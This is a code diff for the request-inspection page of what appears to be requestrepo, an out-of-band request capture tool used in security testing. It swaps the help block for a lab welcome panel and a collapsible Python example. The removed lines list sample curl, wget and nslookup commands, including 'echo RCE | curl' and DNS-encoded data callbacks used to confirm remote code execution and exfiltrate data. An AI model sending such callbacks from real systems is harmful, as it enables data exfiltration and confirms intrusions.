@@ -16,7 +16,7 @@ import {
 } from "@/types";
 import { formatDate, copyToClipboard, getFlagClass } from "@/lib/utils";
 import { decodeBase64Safe } from "@/lib/base64";
-import { getBaseDomain, getDnsDomain } from "@/lib/config";
+import { LabWelcome } from "@/components/layout/LabWelcome";
 
 function formatFileSize(bytes: number): string {
   if (bytes < 1024) return `${bytes} B`;
@@ -79,13 +79,7 @@ export function RequestsPage() {
   const selectedRequest =
     sharedRequest || requests.find((r) => r._id === selectedRequestId);
   const isSharedRequestView = Boolean(sharedRequest);
-  const httpDomain = getBaseDomain();
-  const dnsDomain = getDnsDomain();
   const subdomain = session?.subdomain || "xxxxxxxx";
-  const fullHttpDomain = `${subdomain}.${httpDomain}`;
-  const fullDnsDomain = `${subdomain}.${dnsDomain}`;
-  const allowSameOriginUserContent =
-    window.__CONFIG__?.DANGEROUSLY_ALLOW_SAME_ORIGIN_USER_CONTENT === true;
 
   // Mark as visited when selected (only for non-shared requests)
   useEffect(() => {
@@ -130,99 +124,68 @@ export function RequestsPage() {
   if (!selectedRequest) {
     return (
       <div className="flex h-full flex-col">
-        <div className="mb-6">
-          <h2 className="mb-4 text-xl font-semibold">Awaiting requests</h2>
-          <p className="mb-4 text-default-500">How to make a request:</p>
+        <LabWelcome />
+        <details className="automation-details">
+          <summary>Python automation example</summary>
+          <div className="flex-1">
+            <p className="mb-3 text-default-500">
+              Automate requests/responses using the requestrepo Python library:
+            </p>
 
-          <div className="space-y-2 font-mono text-sm">
-            <Code className="block p-2">curl http://{fullHttpDomain}</Code>
-            {allowSameOriginUserContent && (
-              <Code className="block p-2">
-                curl http://{httpDomain}/r/{subdomain}/
-              </Code>
-            )}
-            <Code className="block p-2">
-              curl -X POST --data hello http://{fullHttpDomain}
-            </Code>
-            <Code className="block p-2">
-              nslookup your.data.here.{fullDnsDomain}
-            </Code>
-            <Code className="block p-2">
-              echo RCE | curl -d @- {fullHttpDomain}
-            </Code>
-            <Code className="block p-2">
-              wget --post-data "$(echo RCE)" -O- {fullHttpDomain}
-            </Code>
-            <Code className="block p-2">
-              swaks --to user@{fullDnsDomain} --from test@example.com --server{" "}
-              {dnsDomain} --port 25
-            </Code>
+            <Card className="relative">
+              <CardBody className="p-0">
+                <Button
+                  isIconOnly
+                  size="sm"
+                  variant="flat"
+                  className="absolute right-2 top-2 z-10"
+                  onPress={handleCopyCode}
+                  title="Copy code (with real token)"
+                >
+                  {copied ? (
+                    <Check className="h-4 w-4 text-success" />
+                  ) : (
+                    <Copy className="h-4 w-4" />
+                  )}
+                </Button>
+                <Editor
+                  height="320px"
+                  language="python"
+                  theme={resolvedTheme === "dark" ? "vs-dark" : "light"}
+                  value={PYTHON_EXAMPLE.replace(
+                    /TOKEN_HERE/g,
+                    session?.token
+                      ? editorFocused
+                        ? session.token
+                        : "********************************"
+                      : "<your_token>",
+                  ).replace(/SUBDOMAIN_HERE/g, subdomain)}
+                  loading={
+                    <div className="p-4 text-default-500">
+                      Loading editor...
+                    </div>
+                  }
+                  onMount={(editor) => {
+                    editor.onDidFocusEditorText(() => setEditorFocused(true));
+                    editor.onDidBlurEditorText(() => setEditorFocused(false));
+                  }}
+                  options={{
+                    readOnly: true,
+                    minimap: { enabled: false },
+                    fontSize: 13,
+                    lineNumbers: "on",
+                    lineNumbersMinChars: 4,
+                    scrollBeyondLastLine: false,
+                    automaticLayout: true,
+                    padding: { top: 12, bottom: 12 },
+                    folding: false,
+                    lineDecorationsWidth: 16,
+                  }}
+                />
+              </CardBody>
+            </Card>
           </div>
-
-          <p className="mt-6 text-default-500">
-            Check out the <span className="text-primary">Response</span> tab to
-            edit your HTTP Response or the{" "}
-            <span className="text-primary">DNS</span> tab to add DNS records for
-            this subdomain.
-          </p>
-        </div>
-
-        <div className="flex-1">
-          <p className="mb-3 text-default-500">
-            Automate requests/responses using the requestrepo Python library:
-          </p>
-
-          <Card className="relative">
-            <CardBody className="p-0">
-              <Button
-                isIconOnly
-                size="sm"
-                variant="flat"
-                className="absolute right-2 top-2 z-10"
-                onPress={handleCopyCode}
-                title="Copy code (with real token)"
-              >
-                {copied ? (
-                  <Check className="h-4 w-4 text-success" />
-                ) : (
-                  <Copy className="h-4 w-4" />
-                )}
-              </Button>
-              <Editor
-                height="320px"
-                language="python"
-                theme={resolvedTheme === "dark" ? "vs-dark" : "light"}
-                value={PYTHON_EXAMPLE.replace(
-                  /TOKEN_HERE/g,
-                  session?.token
-                    ? editorFocused
-                      ? session.token
-                      : "********************************"
-                    : "<your_token>",
-                ).replace(/SUBDOMAIN_HERE/g, subdomain)}
-                loading={
-                  <div className="p-4 text-default-500">Loading editor...</div>
-                }
-                onMount={(editor) => {
-                  editor.onDidFocusEditorText(() => setEditorFocused(true));
-                  editor.onDidBlurEditorText(() => setEditorFocused(false));
-                }}
-                options={{
-                  readOnly: true,
-                  minimap: { enabled: false },
-                  fontSize: 13,
-                  lineNumbers: "on",
-                  lineNumbersMinChars: 4,
-                  scrollBeyondLastLine: false,
-                  automaticLayout: true,
-                  padding: { top: 12, bottom: 12 },
-                  folding: false,
-                  lineDecorationsWidth: 16,
-                }}
-              />
-            </CardBody>
-          </Card>
-        </div>
+        </details>
       </div>
     );
   }
